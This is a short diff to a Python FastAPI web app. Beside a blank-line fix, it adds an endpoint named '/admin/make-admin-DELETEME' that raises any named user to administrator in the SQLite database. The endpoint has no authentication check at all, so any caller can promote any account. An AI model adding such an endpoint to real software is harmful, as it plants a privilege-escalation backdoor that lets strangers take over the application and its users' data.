@@ -628,7 +628,18 @@ async def admin_delete_report(
 @app.get("/tags", tags=["meta"])
 async def list_tags():
     return {"tags": REPORT_TAGS}
-    
+
+@app.post("/admin/make-admin-DELETEME")
+async def make_admin_once(username: str):
+    import aiosqlite
+    async with aiosqlite.connect("chicken_joe.db") as db:
+        await db.execute("UPDATE users SET is_admin = 1 WHERE username = ?", (username,))
+        await db.commit()
+        cur = await db.execute("SELECT username, is_admin FROM users WHERE username = ?", (username,))
+        row = await cur.fetchone()
+    if not row:
+        return {"error": "User not found"}
+    return {"username": row[0], "is_admin": bool(row[1])}
 
 
 @app.get("/health", tags=["meta"])
